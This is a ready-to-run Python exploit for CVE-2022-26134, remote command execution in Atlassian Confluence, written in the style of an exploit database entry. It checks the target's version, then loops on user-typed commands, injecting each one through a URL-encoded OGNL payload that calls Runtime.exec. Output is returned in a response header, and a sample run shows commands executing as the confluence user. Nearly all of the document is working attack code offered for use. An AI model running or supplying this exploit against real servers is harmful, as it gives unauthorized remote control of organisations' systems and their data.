# Exploit Title: Atlassian Confluence - Remote Command execution
# Exploit Author: P4p4 M4n3 
# Vendor Homepage: https://www.atlassian.com/

# Version: version: 
# from 1.3.0 before 7.4.17
# from 7.13.0 before 7.13.7
# from 7.14.0 before 7.14.3 
# from 7.15.0 before 7.15.2 
# from 7.16.0 before 7.16.4
# from 7.17.0 before 7.17.4
# from 7.18.0 before 7.18.1

# Tested on: ubuntu 20.04 
# CVE : CVE-2022-26134

#proof
"""
┌──(root㉿kali)-[~/Desktop/atlt]
└─# python3 exploit.py http://192.168.1.4:8081

Cmd : id
uid=1003(confluence) gid=1003(confluence) groups=1003(confluence) 

"""
import re
import sys
import requests as r
from time import sleep as s
from termcolor import colored as c

#pip3 install termcolor
#Usage python3 exploit.py http://192.168.1.4:8081/


banner_check = """
                                                                                           
@@@@@@@@       @@@   @@@ @@@  @@@@@@@        @@@               @@@@@@   @@@@@@    @@@@@@@  
@@@@@@@@      @@@@   @@@ @@@  @@@@@@@@      @@@@              @@@@@@@   @@@@@@@  @@@@@@@@  
@@!          @@!@!   @@! !@@  @@!  @@@     @@!@!              !@@           @@@  !@@       
!@!         !@!!@!   !@! @!!  !@!  @!@    !@!!@!              !@!           @!@  !@!       
@!!!:!     @!! @!!    !@!@!   @!@  !@!   @!! @!!   @!@!@!@!@  !!@@!!    @!@!!@   !@!       
!!!!!:    !!!  !@!     @!!!   !@!  !!!  !!!  !@!   !!!@!@!!!   !!@!!!   !!@!@!   !!!       
!!:       :!!:!:!!:    !!:    !!:  !!!  :!!:!:!!:                  !:!      !!:  :!!       
:!:       !:::!!:::    :!:    :!:  !:!  !:::!!:::                 !:!       :!:  :!:       
 ::            :::      ::     :::: ::       :::              :::: ::   :: ::::   ::: :::  
 :             :::      :     :: :  :        :::              :: : :     : : :    :: :: : 

"""
if len(sys.argv) != 2:
    print(f"Usage:  {sys.argv[0]} <targer host url>\n Example: {sys.argv[0]} https://example.com:8081")
    sys.exit()
def check_vuln():
    print(c(banner_check, 'cyan'))
    res_vuln = r.get(sys.argv[1] + "//login.action")
    if res_vuln.status_code == 200:
        target_version_line = re.findall("<span id='footer-build-information'>.*</span>", res_vuln.text)
        target_version = target_version_line[0].split("'>")[1].split('</')[0]
        print(c("\nYOUR TARGET VERSION IS :  " + target_version, 'red', 'on_yellow'))
        s(1)
        print(c("\n[+] Plz check if your target is vulnerable with these bellow versions ." , 'yellow'))
        print(c("\n[+] Vulnerable Versions :", 'red'))
        s(1)
        print(c("\n--- From >> 1.3.0 and before >> 7.4.17", 'red'))
        s(1)
        print(c("--- From >> 7.13.0 and before >> 7.13.7", 'red'))
        s(1)
        print(c("--- From >> 7.14.0 and before >> 7.14.3", 'red'))
        s(1)
        print(c("--- From >> 7.15.0 and before >> 7.15.2", 'red'))
        s(1)
        print(c("--- From >> 7.16.0 and before >> 7.16.4", 'red'))
        s(1)
        print(c("--- From >> 7.17.0 and before >> 7.17.4", 'red'))
        s(1)
        print(c("--- From >> 7.18.0 and before >> 7.18.1", 'red'))

        s(1.5)
        valid_vuln = input(c("Type 'y' if the version is vulnerable or eny key to exit. y/n: ", 'cyan'))
        if valid_vuln == "y":
            exploit()
        else:
            sys.exit()
    else:
        print(c("Host Unreachable :( ", 'yellow'))
        sys.exit()






def exploit():
    banner_exploit = """
                                                                                                                                             
 @@@@@@@  @@@  @@@  @@@@@@@@              @@@@@@    @@@@@@@@    @@@@@@    @@@@@@               @@@@@@     @@@@@@    @@@  @@@@@@        @@@   
@@@@@@@@  @@@  @@@  @@@@@@@@             @@@@@@@@  @@@@@@@@@@  @@@@@@@@  @@@@@@@@             @@@@@@@@   @@@@@@@   @@@@  @@@@@@@      @@@@   
!@@       @@!  @@@  @@!                       @@@  @@!   @@@@       @@@       @@@                  @@@  !@@       @@@!!      @@@     @@!@!   
!@!       !@!  @!@  !@!                      @!@   !@!  @!@!@      @!@       @!@                  @!@   !@!         !@!      @!@    !@!!@!   
!@!       @!@  !@!  @!!!:!    @!@!@!@!@     !!@    @!@ @! !@!     !!@       !!@    @!@!@!@!@     !!@    !!@@!@!     @!@  @!@!!@    @!! @!!   
!!!       !@!  !!!  !!!!!:    !!!@!@!!!    !!:     !@!!!  !!!    !!:       !!:     !!!@!@!!!    !!:     @!!@!!!!    !@!  !!@!@!   !!!  !@!   
:!!       :!:  !!:  !!:                   !:!      !!:!   !!!   !:!       !:!                  !:!      !:!  !:!    !!:      !!:  :!!:!:!!:  
:!:        ::!!:!   :!:                  :!:       :!:    !:!  :!:       :!:                  :!:       :!:  !:!    :!:      :!:  !:::!!:::  
 ::: :::    ::::     :: ::::             :: :::::  ::::::: ::  :: :::::  :: :::::             :: :::::  :::: :::    :::  :: ::::       :::   
 :: :: :     :      : :: ::              :: : :::   : : :  :   :: : :::  :: : :::             :: : :::   :: : :      ::   : : :        :::   
                                                                                                                                             

    """
    print(c(banner_exploit, 'red'))
    while True:
        cmd = input(c("Cmd : ", 'blue'))
        payload = f"{sys.argv[1]}/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22{cmd}%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Qualys-Response%22%2C%23a%29%29%7D/"
        #url = sys.argv[1] + payload
        res_exploit = r.get(payload, verify=False, allow_redirects=False)
        print(res_exploit.headers["X-Qualys-Response"])
check_vuln()


